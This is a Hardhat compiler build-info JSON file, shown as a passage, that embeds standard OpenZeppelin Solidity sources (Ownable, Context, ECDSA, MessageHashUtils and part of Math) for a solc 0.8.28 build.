{"id":"c1fd1e1a52d95ae2fa14f36148e9326c","_format":"hh-sol-build-info-1","solcVersion":"0.8.28","solcLongVersion":"0.8.28+commit.7893614a","input":{"language":"Solidity","sources":{"@openzeppelin/contracts/access/Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\n\npragma solidity ^0.8.20;\n\nimport {Context} from \"../utils/Context.sol\";\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * The initial owner is set to the address provided by the deployer. This can\n * later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account);\n\n    /**\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\n     */\n    error OwnableInvalidOwner(address owner);\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\n     */\n    constructor(address initialOwner) {\n        if (initialOwner == address(0)) {\n            revert OwnableInvalidOwner(address(0));\n        }\n        _transferOwnership(initialOwner);\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner() internal view virtual {\n        if (owner() != _msgSender()) {\n            revert OwnableUnauthorizedAccount(_msgSender());\n        }\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        if (newOwner == address(0)) {\n            revert OwnableInvalidOwner(address(0));\n        }\n        _transferOwnership(newOwner);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n"},"@openzeppelin/contracts/utils/Context.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n\n    function _contextSuffixLength() internal view virtual returns (uint256) {\n        return 0;\n    }\n}\n"},"@openzeppelin/contracts/utils/cryptography/ECDSA.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/cryptography/ECDSA.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Elliptic Curve Digital Signature Algorithm (ECDSA) operations.\n *\n * These functions can be used to verify that a message was signed by the holder\n * of the private keys of a given address.\n */\nlibrary ECDSA {\n    enum RecoverError {\n        NoError,\n        InvalidSignature,\n        InvalidSignatureLength,\n        InvalidSignatureS\n    }\n\n    /**\n     * @dev The signature derives the `address(0)`.\n     */\n    error ECDSAInvalidSignature();\n\n    /**\n     * @dev The signature has an invalid length.\n     */\n    error ECDSAInvalidSignatureLength(uint256 length);\n\n    /**\n     * @dev The signature has an S value that is in the upper half order.\n     */\n    error ECDSAInvalidSignatureS(bytes32 s);\n\n    /**\n     * @dev Returns the address that signed a hashed message (`hash`) with `signature` or an error. This will not\n     * return address(0) without also returning an error description. Errors are documented using an enum (error type)\n     * and a bytes32 providing additional information about the error.\n     *\n     * If no error is returned, then the address can be used for verification purposes.\n     *\n     * The `ecrecover` EVM precompile allows for malleable (non-unique) signatures:\n     * this function rejects them by requiring the `s` value to be in the lower\n     * half order, and the `v` value to be either 27 or 28.\n     *\n     * IMPORTANT: `hash` _must_ be the result of a hash operation for the\n     * verification to be secure: it is possible to craft signatures that\n     * recover to arbitrary addresses for non-hashed data. A safe way to ensure\n     * this is by receiving a hash of the original message (which may otherwise\n     * be too long), and then calling {MessageHashUtils-toEthSignedMessageHash} on it.\n     *\n     * Documentation for signature generation:\n     * - with https://web3js.readthedocs.io/en/v1.3.4/web3-eth-accounts.html#sign[Web3.js]\n     * - with https://docs.ethers.io/v5/api/signer/#Signer-signMessage[ethers]\n     */\n    function tryRecover(\n        bytes32 hash,\n        bytes memory signature\n    ) internal pure returns (address recovered, RecoverError err, bytes32 errArg) {\n        if (signature.length == 65) {\n            bytes32 r;\n            bytes32 s;\n            uint8 v;\n            // ecrecover takes the signature parameters, and the only way to get them\n            // currently is to use assembly.\n            assembly (\"memory-safe\") {\n                r := mload(add(signature, 0x20))\n                s := mload(add(signature, 0x40))\n                v := byte(0, mload(add(signature, 0x60)))\n            }\n            return tryRecover(hash, v, r, s);\n        } else {\n            return (address(0), RecoverError.InvalidSignatureLength, bytes32(signature.length));\n        }\n    }\n\n    /**\n     * @dev Returns the address that signed a hashed message (`hash`) with\n     * `signature`. This address can then be used for verification purposes.\n     *\n     * The `ecrecover` EVM precompile allows for malleable (non-unique) signatures:\n     * this function rejects them by requiring the `s` value to be in the lower\n     * half order, and the `v` value to be either 27 or 28.\n     *\n     * IMPORTANT: `hash` _must_ be the result of a hash operation for the\n     * verification to be secure: it is possible to craft signatures that\n     * recover to arbitrary addresses for non-hashed data. A safe way to ensure\n     * this is by receiving a hash of the original message (which may otherwise\n     * be too long), and then calling {MessageHashUtils-toEthSignedMessageHash} on it.\n     */\n    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {\n        (address recovered, RecoverError error, bytes32 errorArg) = tryRecover(hash, signature);\n        _throwError(error, errorArg);\n        return recovered;\n    }\n\n    /**\n     * @dev Overload of {ECDSA-tryRecover} that receives the `r` and `vs` short-signature fields separately.\n     *\n     * See https://eips.ethereum.org/EIPS/eip-2098[ERC-2098 short signatures]\n     */\n    function tryRecover(\n        bytes32 hash,\n        bytes32 r,\n        bytes32 vs\n    ) internal pure returns (address recovered, RecoverError err, bytes32 errArg) {\n        unchecked {\n            bytes32 s = vs & bytes32(0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);\n            // We do not check for an overflow here since the shift operation results in 0 or 1.\n            uint8 v = uint8((uint256(vs) >> 255) + 27);\n            return tryRecover(hash, v, r, s);\n        }\n    }\n\n    /**\n     * @dev Overload of {ECDSA-recover} that receives the `r and `vs` short-signature fields separately.\n     */\n    function recover(bytes32 hash, bytes32 r, bytes32 vs) internal pure returns (address) {\n        (address recovered, RecoverError error, bytes32 errorArg) = tryRecover(hash, r, vs);\n        _throwError(error, errorArg);\n        return recovered;\n    }\n\n    /**\n     * @dev Overload of {ECDSA-tryRecover} that receives the `v`,\n     * `r` and `s` signature fields separately.\n     */\n    function tryRecover(\n        bytes32 hash,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal pure returns (address recovered, RecoverError err, bytes32 errArg) {\n        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\n        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n        // the valid range for s in (301): 0 < s < secp256k1n ÷ 2 + 1, and for v in (302): v ∈ {27, 28}. Most\n        // signatures from current libraries generate a unique signature with an s-value in the lower half order.\n        //\n        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\n        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\n        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept\n        // these malleable signatures as well.\n        if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {\n            return (address(0), RecoverError.InvalidSignatureS, s);\n        }\n\n        // If the signature is valid (and not malleable), return the signer address\n        address signer = ecrecover(hash, v, r, s);\n        if (signer == address(0)) {\n            return (address(0), RecoverError.InvalidSignature, bytes32(0));\n        }\n\n        return (signer, RecoverError.NoError, bytes32(0));\n    }\n\n    /**\n     * @dev Overload of {ECDSA-recover} that receives the `v`,\n     * `r` and `s` signature fields separately.\n     */\n    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {\n        (address recovered, RecoverError error, bytes32 errorArg) = tryRecover(hash, v, r, s);\n        _throwError(error, errorArg);\n        return recovered;\n    }\n\n    /**\n     * @dev Optionally reverts with the corresponding custom error according to the `error` argument provided.\n     */\n    function _throwError(RecoverError error, bytes32 errorArg) private pure {\n        if (error == RecoverError.NoError) {\n            return; // no error: do nothing\n        } else if (error == RecoverError.InvalidSignature) {\n            revert ECDSAInvalidSignature();\n        } else if (error == RecoverError.InvalidSignatureLength) {\n            revert ECDSAInvalidSignatureLength(uint256(errorArg));\n        } else if (error == RecoverError.InvalidSignatureS) {\n            revert ECDSAInvalidSignatureS(errorArg);\n        }\n    }\n}\n"},"@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.3.0) (utils/cryptography/MessageHashUtils.sol)\n\npragma solidity ^0.8.20;\n\nimport {Strings} from \"../Strings.sol\";\n\n/**\n * @dev Signature message hash utilities for producing digests to be consumed by {ECDSA} recovery or signing.\n *\n * The library provides methods for generating a hash of a message that conforms to the\n * https://eips.ethereum.org/EIPS/eip-191[ERC-191] and https://eips.ethereum.org/EIPS/eip-712[EIP 712]\n * specifications.\n */\nlibrary MessageHashUtils {\n    /**\n     * @dev Returns the keccak256 digest of an ERC-191 signed data with version\n     * `0x45` (`personal_sign` messages).\n     *\n     * The digest is calculated by prefixing a bytes32 `messageHash` with\n     * `\"\\x19Ethereum Signed Message:\\n32\"` and hashing the result. It corresponds with the\n     * hash signed when using the https://ethereum.org/en/developers/docs/apis/json-rpc/#eth_sign[`eth_sign`] JSON-RPC method.\n     *\n     * NOTE: The `messageHash` parameter is intended to be the result of hashing a raw message with\n     * keccak256, although any bytes32 value can be safely used because the final digest will\n     * be re-hashed.\n     *\n     * See {ECDSA-recover}.\n     */\n    function toEthSignedMessageHash(bytes32 messageHash) internal pure returns (bytes32 digest) {\n        assembly (\"memory-safe\") {\n            mstore(0x00, \"\\x19Ethereum Signed Message:\\n32\") // 32 is the bytes-length of messageHash\n            mstore(0x1c, messageHash) // 0x1c (28) is the length of the prefix\n            digest := keccak256(0x00, 0x3c) // 0x3c is the length of the prefix (0x1c) + messageHash (0x20)\n        }\n    }\n\n    /**\n     * @dev Returns the keccak256 digest of an ERC-191 signed data with version\n     * `0x45` (`personal_sign` messages).\n     *\n     * The digest is calculated by prefixing an arbitrary `message` with\n     * `\"\\x19Ethereum Signed Message:\\n\" + len(message)` and hashing the result. It corresponds with the\n     * hash signed when using the https://ethereum.org/en/developers/docs/apis/json-rpc/#eth_sign[`eth_sign`] JSON-RPC method.\n     *\n     * See {ECDSA-recover}.\n     */\n    function toEthSignedMessageHash(bytes memory message) internal pure returns (bytes32) {\n        return\n            keccak256(bytes.concat(\"\\x19Ethereum Signed Message:\\n\", bytes(Strings.toString(message.length)), message));\n    }\n\n    /**\n     * @dev Returns the keccak256 digest of an ERC-191 signed data with version\n     * `0x00` (data with intended validator).\n     *\n     * The digest is calculated by prefixing an arbitrary `data` with `\"\\x19\\x00\"` and the intended\n     * `validator` address. Then hashing the result.\n     *\n     * See {ECDSA-recover}.\n     */\n    function toDataWithIntendedValidatorHash(address validator, bytes memory data) internal pure returns (bytes32) {\n        return keccak256(abi.encodePacked(hex\"19_00\", validator, data));\n    }\n\n    /**\n     * @dev Variant of {toDataWithIntendedValidatorHash-address-bytes} optimized for cases where `data` is a bytes32.\n     */\n    function toDataWithIntendedValidatorHash(\n        address validator,\n        bytes32 messageHash\n    ) internal pure returns (bytes32 digest) {\n        assembly (\"memory-safe\") {\n            mstore(0x00, hex\"19_00\")\n            mstore(0x02, shl(96, validator))\n            mstore(0x16, messageHash)\n            digest := keccak256(0x00, 0x36)\n        }\n    }\n\n    /**\n     * @dev Returns the keccak256 digest of an EIP-712 typed data (ERC-191 version `0x01`).\n     *\n     * The digest is calculated from a `domainSeparator` and a `structHash`, by prefixing them with\n     * `\\x19\\x01` and hashing the result. It corresponds to the hash signed by the\n     * https://eips.ethereum.org/EIPS/eip-712[`eth_signTypedData`] JSON-RPC method as part of EIP-712.\n     *\n     * See {ECDSA-recover}.\n     */\n    function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32 digest) {\n        assembly (\"memory-safe\") {\n            let ptr := mload(0x40)\n            mstore(ptr, hex\"19_01\")\n            mstore(add(ptr, 0x02), domainSeparator)\n            mstore(add(ptr, 0x22), structHash)\n            digest := keccak256(ptr, 0x42)\n        }\n    }\n}\n"},"@openzeppelin/contracts/utils/math/Math.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.3.0) (utils/math/Math.sol)\n\npragma solidity ^0.8.20;\n\nimport {Panic} from \"../Panic.sol\";\nimport {SafeCast} from \"./SafeCast.sol\";\n\n/**\n * @dev Standard math utilities missing in the Solidity language.\n */\nlibrary Math {\n    enum Rounding {\n        Floor, // Toward negative infinity\n        Ceil, // Toward positive infinity\n        Trunc, // Toward zero\n        Expand // Away from zero\n    }\n\n    /**\n     * @dev Return the 512-bit addition of two uint256.\n     *\n     * The result is stored in two 256 variables such that sum = high * 2²⁵⁶ + low.\n     */\n    function add512(uint256 a, uint256 b) internal pure returns (uint256 high, uint256 low) {\n        assembly (\"memory-safe\") {\n            low := add(a, b)\n            high := lt(low, a)\n        }\n    }\n\n    /**\n     * @dev Return the 512-bit multiplication of two uint256.\n     *\n     * The result is stored in two 256 variables such that product = high * 2²⁵⁶ + low.\n     */\n    function mul512(uint256 a, uint256 b) internal pure returns (uint256 high, uint256 low) {\n        // 512-bit multiply [high low] = x * y. Compute the product mod 2²⁵⁶ and mod 2²⁵⁶ - 1, then use\n        // the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\n        // variables such that product = high * 2²⁵⁶ + low.\n        assembly (\"memory-safe\") {\n            let mm := mulmod(a, b, not(0))\n            low := mul(a, b)\n            high := sub(sub(mm, low), lt(mm, low))\n        }\n    }\n\n    /**\n     * @dev Returns the addition of two unsigned integers, with a success flag (no overflow).\n     */\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\n        unchecked {\n            uint256 c = a + b;\n            success = c >= a;\n            result = c * SafeCast.toUint(success);\n        }\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, with a success flag (no overflow).\n     */\n    function trySub(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\n        unchecked {\n            uint256 c = a - b;\n            success = c <= a;\n            result = c * SafeCast.toUint(success);\n        }\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, with a success flag (no overflow).\n     */\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\n        unchecked {\n            uint256 c = a * b;\n            assembly (\"memory-safe\") {\n                // Only true when the multiplication doesn't overflow\n                // (c / a == b) || (a == 0)\n                success := or(eq(div(c, a), b), iszero(a))\n            }\n            // equivalent to: success ? c : 0\n            result = c * SafeCast.toUint(success);\n        }\n    }\n\n    /**\n     * @dev Returns the division of two unsigned integers, with a success flag (no division by zero).\n     */\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\n        unchecked {\n            success = b > 0;\n            assembly (\"memory-safe\") {\n                // The `DIV` opcode returns zero when the denominator is 0.\n                result := div(a, b)\n            }\n        }\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers, with a success flag (no division by zero).\n     */\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\n        unchecked {\n            success = b > 0;\n            assembly (\"memory-safe\") {\n                // The `MOD` opcode returns zero when the denominator is 0.\n                result := mod(a, b)\n            }\n        }\n    }\n\n    /**\n     * @dev Unsigned saturating addition, bounds to `2²⁵⁶ - 1` instead of overflowing.\n     */\n    function saturatingAdd(uint256 a, uint256 b) internal pure returns (uint256) {\n        (bool success, uint256 result) = tryAdd(a, b);\n        return ternary(success, result, type(uint256).max);\n    }\n\n    /**\n     * @dev Unsigned saturating subtraction, bounds to zero instead of overflowing.\n     */\n    function saturatingSub(uint256 a, uint256 b) internal pure returns (uint256) {\n        (, uint256 result) = trySub(a, b);\n        return result;\n    }\n\n    /**\n     * @dev Unsigned saturating multiplication, bounds to `2²⁵⁶ - 1` instead of overflowing.\n     */\n    function saturatingMul(uint256 a, uint256 b) internal pure returns (uint256) {\n        (bool success, uint256 result) = tryMul(a, b);\n        return ternary(success, result, type(uint256).max);\n    }\n\n    /**\n     * @dev Branchless ternary evaluation for `a ? b : c`. Gas costs are constant.\n     *\n     * IMPORTANT: This function may reduce bytecode size and consume less gas when used standalone.\n     * However, the compiler may optimize Solidity ternary operations (i.e. `a ? b : c`) to only compute\n     * one branch when needed, making this function more expensive.\n     */\n    function ternary(bool condition, uint256 a, uint256 b) internal pure returns (uint256) {\n        unchecked {\n            // branchless ternary works because:\n            // b ^ (a ^ b) == a\n            // b ^ 0 == b\n            return b ^ ((a ^ b) * SafeCast.toUint(condition));\n        }\n    }\n\n    /**\n     * @dev Returns the largest of two numbers.\n     */\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return ternary(a > b, a, b);\n    }\n\n    /**\n     * @dev Returns the smallest of two numbers.\n     */\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\n        return ternary(a < b, a, b);\n    }\n\n    /**\n     * @dev Returns the average of two numbers. The result is rounded towards\n     * zero.\n     */\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\n        // (a + b) / 2 can overflow.\n        return (a & b) + (a ^ b) / 2;\n    }\n\n    /**\n     * @dev Returns the ceiling of the division of two numbers.\n     *\n     * This differs from standard division with `/` in that it rounds towards infinity instead\n     * of rounding towards zero.\n     */\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (b == 0) {\n            // Guarantee the same behavior as in a regular Solidity division.\n            Panic.panic(Panic.DIVISION_BY_ZERO);\n        }\n\n        // The following calculation ensures accurate ceiling division without overflow.\n        // Since a is non-zero, (a - 1) / b will not overflow.\n        // The largest possible result occurs when (a - 1) / b is type(uint256).max,\n        // but the largest value we can obtain is type(uint256).max - 1, which happens\n        // when a = type(uint256).max and b = 1.\n        unchecked {\n            return SafeCast.toUint(a > 0) * ((a - 1) / b + 1);\n        }\n    }\n\n    /**\n     * @dev Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or\n     * denominator == 0.\n     *\n     * Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv) with further edits by\n     * Uniswap Labs also under MIT license.\n     */\n    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {\n        unchecked {\n            (uint256 high, uint256 low) = mul512(x, y);\n\n            // Handle non-overflow cases, 256 by 256 division.\n            if (high == 0) {\n                // Solidity will revert if denominator == 0, unlike the div opcode on its own.\n                // The surrounding unchecked block does not change this fact.\n                // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.\n                return low / denominator;\n            }\n\n            // Make sure the result is less than 2²⁵⁶. Also prevents denominator == 0.\n            if (denominator <= high) {\n                Panic.panic(ternary(denominator == 0, Panic.DIVISION_BY_ZERO, Panic.UNDER_OVERFLOW));\n            }\n\n            ///////////////////////////////////////////////\n            // 512 by 256 division.\n            ///////////////////////////////////////////////\n\n            // Make division exact by subtracting the remainder from [high low].\n            uint256 remainder;\n            assembly (\"memory-safe\") {\n                // Compute remainder using mulmod.\n                remainder := mulmod(x, y, denominator)\n\n                // Subtract 256 bit number from 512 bit number.\n                high := sub(high, gt(remainder, low))\n                low := sub(low, remainder)\n            }\n\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator.\n            // Always >= 1. See https://cs.stackexchange.com/q/138556/92363.\n\n            uint256 twos = denominator & (0 - denominator);\n            assembly (\"memory-safe\") {\n                // Divide denominator by twos.\n                denominator := div(denominator, twos)\n\n                // Divide [high low] by twos.\n                low := div(low, twos)\n\n                // Flip twos such that it is 2²⁵⁶ / twos. If twos is zero, then it becomes one.\n                twos := add(div(sub(0, twos), twos), 1)\n            }\n\n            // Shift in bits from high into low.\n            low |= high * twos;\n\n            // Invert denominator mod 2²⁵⁶. Now that denominator is an odd number, it has an inverse modulo 2²⁵⁶ such\n            // that denominator * inv ≡ 1 mod 2²⁵⁶. Compute the inverse by starting with a seed that is correct for\n            // four bits. That is, denominator * inv ≡ 1 mod 2⁴.\n            uint256 inverse = (3 * denominator) ^ 2;\n\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also\n            // works in modular arithmetic, doubling the correct bits in each step.\n            inverse *= 2 - denominator * inverse; // inverse mod 2⁸\n            inverse *= 2 - denominator * inverse; // inverse mod 2¹⁶\n            inverse *= 2 - denominator * inverse; // inverse mod 2³²\n            inverse *= 2 - denominator * inverse; // inverse mod 2⁶⁴\n            inverse *= 2 - denominator * inverse; // inverse mod 2¹²⁸\n            inverse *= 2 - denominator * inverse; // inverse mod 2²⁵⁶\n\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\n            // This will give us the correct result modulo 2²⁵⁶. Since the preconditions guarantee that the outcome is\n            // less than 2²⁵⁶, this is the final result. We don't need to compute the high bits of the result and high\n            // is no longer required.\n            result = low * inverse;\n            return result;\n        }\n    }\n\n    /**\n     * @dev Calculates x * y / denominator with full precision, following the selected rounding direction.\n     */\n    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {\n        return mulDiv(x, y, denominator) + SafeCast.toUint(unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0);\n    }\n\n    /**\n     * @dev Calculates floor(x * y >> n) with full precision. Throws if result overflows a uint256.\n     */\n    function mulShr(uint256 x, uint256 y, uint8 n) internal pure returns (uint256 result) {\n        unchecked {\n            (uint256 high, uint256 low) = mul512(x, y);\n            if (high >= 1 << n) {\n                Panic.panic(Panic.UNDER_OVERFLOW);\n            }\n            return (high << (256 - n)) | (low >> n);\n        }\n    }\n\n    /**\n     * @dev Calculates x * y >> n with full precision, following the selected rounding direction.\n     */\n    function mulShr(uint256 x, uint256 y, uint8 n, Rounding rounding) internal pure returns (uint256) {\n        return mulShr(x, y, n) + SafeCast.toUint(unsignedRoundsUp(rounding) && mulmod(x, y, 1 << n) > 0);\n    }\n\n    /**\n     * @dev Calculate the modular multiplicative inverse of a number in Z/nZ.\n     *\n     * If n is a prime, then Z/nZ is a field. In that case all elements are inversible, except 0.\n     * If n is not a prime, then Z/nZ is not a field, and some elements might not be inversible.\n     *\n     * If the input value is not inversible, 0 is returned.\n     *\n     * NOTE: If you know for sure that n is (big) a prime, it may be cheaper to use Fermat's little theorem and get the\n     * inverse using `Math.modExp(a, n - 2, n)`. See {invModPrime}.\n     */\n    function invMod(uint256 a, uint256 n) internal pure returns (uint256) {\n        unchecked {\n            if (n == 0) return 0;\n\n            // The inverse modulo is calculated using the Extended Euclidean Algorithm (iterative version)\n            // Used to compute integers x and y such that: ax + ny = gcd(a, n).\n            // When the gcd is 1, then the inverse of a modulo n exists and it's x.\n            // ax + ny = 1\n            // ax = 1 + (-y)n\n            // ax ≡ 1 (mod n) # x is the inverse of a modulo n\n\n            // If the remainder is 0 the gcd is n right away.\n            uint256 remainder = a % n;\n            uint256 gcd = n;\n\n            // Therefore the initial coefficients are:\n            // ax + ny = gcd(a, n) = n\n            // 0a + 1n = n\n            int256 x = 0;\n            int256 y = 1;\n\n            while (remainder != 0) {\n                uint256 quotient = gcd / remainder;\n\n                (gcd, remainder) = (\n                    // The old remainder is the next gcd to try.\n                    remainder,\n                    // Compute the next remainder.\n                    // Can't overflow given that (a % gcd) * (gcd // (a % gcd)) <= gcd\n                    // where gcd is at most n (capped to type(uint256).max)\n                    gcd - remainder * quotient\n                );\n\n                (x, y) = (\n                    // Increment the coefficient of a.\n                    y,\n                    // Decrement the coefficient of n.\n                    // Can overflow, but the result is casted to uint256 so that the\n                    // next value of y is \"wrapped around\" to a value between 0 and n - 1.\n                    x - y * int256(quotient)\n                );\n            }\n\n            if (gcd != 1) return 0; // No inverse exists.\n            return ternary(x < 0, n - uint256(-x), uint256(x)); // Wrap the result if it's negative.\n        }\n    }\n\n    /**\n     * @dev Variant of {invMod}. More efficient, but only works if `p` is known to be a prime greater than `2`.\n     *\n     * From https://en.wikipedia.org/wiki/Fermat%27s_little_theorem[Fermat's little theorem], we know that if p is\n     * prime, then `a**(p-1) ≡ 1 mod p`. As a consequence, we have `a * a**(p-2) ≡ 1 mod p`, which means that\n     * `a**(p-2)` is the modular multiplicative inverse of a in Fp.\n     *\n     * NOTE: this function does NOT check that `p` is a prime greater than `2`.\n     */\n    function invModPrime(uint256 a, uint256 p) internal view returns (uint256) {\n        unchecked {\n            return Math.modExp(a, p - 2, p);\n        }\n    }\n\n    /**\n     * @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m)\n     *\n     * Requirements:\n     * - modulus can't be zero\n     * - underlying staticcall to precompile must succeed\n     *\n     * IMPORTANT: The result is only valid if the underlying call succeeds. When using this function, make\n     * sure the chain you're using it on supports the precompiled contract for modular exponentiation\n     * at address 0x05 as specified in https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise,\n     * the underlying function will succeed given the lack of a revert, but the result may be incorrectly\n     * interpreted as 0.\n     */\n    function modExp(uint256 b, uint256 e, uint256 m) internal view returns (uint256) {\n        (bool success, uint256 result) = tryModExp(b, e, m);\n        if (!success) {\n            Panic.panic(Panic.DIVISION_BY_ZERO);\n        }\n        return result;\n    }\n\n    /**\n     * @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m).\n     * It includes a success flag indicating if the operation succeeded. Operation will be marked as failed if trying\n     * to operate modulo 0 or if the underlying precompile reverted.\n     *\n     * IMPORTANT: The result is only valid if the success flag is true. When using this function, make sure the chain\n     * you're using it on supports the precompiled contract for modular exponentiation at address 0x05 as specified in\n     * https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise, the underlying function will succeed given the lack\n     * of a revert, but the result may be incorrectly interpreted as 0.\n     */\n    function tryModExp(uint256 b, uint256 e, uint256 m) internal view returns (bool success, uint256 result) {\n        if (m == 0) return (false, 0);\n        assembly (\"memory-safe\") {\n            let ptr := mload(0x40)\n            // | Offset    | Content    | Content (Hex)                                                      |\n            // |-----------|------------|--------------------------------------------------------------------|\n            // | 0x00:0x1f | size of b  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\n            // | 0x20:0x3f | size of e  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\n            // | 0x40:0x5f | size of m  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\n            // | 0x60:0x7f | value of b | 0x<.............................................................b> |\n            // | 0x80:0x9f | value of e | 0x<.............................................................e> |\n            // | 0xa0:0xbf | value of m | 0x<.............................................................m> |\n            mstore(ptr, 0x20)\n            mstore(add(ptr, 0x20), 0x20)\n            mstore(add(ptr, 0x40), 0x20)\n            mstore(add(ptr, 0x60), b)\n            mstore(add(ptr, 0x80), e)\n            mstore(add(ptr, 0xa0), m)\n\n            // Given the result < m, it's guaranteed to fit in 32 bytes,\n            // so we can use the memory scratch space located at offset 0.\n            success := staticcall(gas(), 0x05, ptr, 0xc0, 0x00, 0x20)\n            result := mload(0x00)\n        }\n    }\n\n    /**\n     * @dev Variant of {modExp} that supports inputs of arbitrary length.\n     */\n    function modExp(bytes memory b, bytes memory e, bytes memory m) internal view returns (bytes memory) {\n        (bool success, bytes memory result) = tryModExp(b, e, m);\n        if (!success) {\n            Panic.panic(Panic.DIVISION_BY_ZERO);\n        }\n        return result;\n    }\n\n    /**\n     * @dev Variant of {tryModExp} that supports inputs of arbitrary length.\n     */\n    function tryModExp(\n        bytes memory b,\n        bytes memory e,\n        bytes memory m\n    ) internal view returns (bool success, bytes memory result) {\n        if (_zeroBytes(m)) return (false, new bytes(0));\n\n        uint256 mLen = m.length;\n\n        // Encode call args in result and move the free memory pointer\n        result = abi.encodePacked(b.length, e.length, mLen, b, e, m);\n\n        assembly (\"memory-safe\") {\n            let dataPtr := add(result, 0x20)\n            // Write result on top of args to avoid allocating extra memory.\n            success := staticcall(gas(), 0x05, dataPtr, mload(result), dataPtr, mLen)\n            // Overwrite the length.\n            // result.length > returndatasize() is guaranteed because returndatasize() == m.length\n            mstore(result, mLen)\n            // Set the memory pointer after the returned data.\n            mstore(0x40, add(dataPtr, mLen))\n        }\n    }\n\n    /**\n     * @dev Returns whether the provided byte array is zero.\n     */\n    function _zeroBytes(bytes memory 